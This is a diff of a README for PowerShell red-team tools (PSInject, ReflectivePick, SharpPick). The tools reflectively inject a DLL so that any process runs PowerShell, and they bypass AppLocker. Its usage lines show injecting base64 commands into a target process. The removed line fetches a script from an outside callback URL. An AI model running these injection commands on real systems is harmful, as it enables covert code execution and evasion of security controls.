@@ -10,18 +10,18 @@ Will Schroeder (@harmj0y)
 Stark
 
 ## PSInject.ps1
-This project provides a powershell scipt (psinject.ps1) which implements the Invoke-PSInject function. This script is based off Powersploit's Invoke-ReflectivePEInjection and reflectively injects the ReflectivePick DLL. It allows for the replacement of the callback URL that is hard coded into the DLL. See this script for more details. 
+This project provides a powershell scipt which implements the Invoke-PSInject function. This script is based off Powersploit's Invoke-ReflectivePEInjection and reflectively injects the ReflectivePick DLL. It allows for the replacement of the powershell code to execute that is hard coded into the DLL. See this script for more details. 
 
-The script that it calls back for must be base64 encoded. To do this, you can simply use the built in linux utility 'base64'. 
+When executed, you provide the "PoshCode" paramter which is base64 encoded powershell commands
 
 #### Example:
-	import-module psinject.ps1
-	Invoke-PSInject -Verbose -ProcID 0000 -CBURL http://1.1.1.1/favicon.ico
+	import-module Invoke-PSInject.ps1
+	Invoke-PSInject -Verbose -PoshCode Y2FsYy5leGU= -ProcId 1111 -Verbose
 
 ## ReflectivePick
 This project is a reflective DLL based on Stephen Fewer's method. It imports/runs a .NET assembly into its memory space that supports the running of Powershell code using System.Management.Automation. Due to its' reflective property, it can be injected into any process using a reflective injector and allows the execution of Powershell code by any process, not just Powershell.exe. It extends inject/migrate capabilities into powershell. 
 
-This DLL is meant to be used with PSInject.ps1 which provide the ability to modify the hardcoded callback URL or with Metasploit after compiling or patching the URL manually.
+This DLL is meant to be used with PSInject.ps1 which provide the ability to modify the powerShell command or with Metasploit after compiling or patching the command manually.
 
 ## SharpPick
 This project is a .NET executable which allows execution of Powershell code through a number of methods. The script can be embedded as a resource, read from a url, appeneded to the binary, or read from a file. It was originally used as a proof of concept to demonstrate/test the blocking of powershell and bypass of applocker.
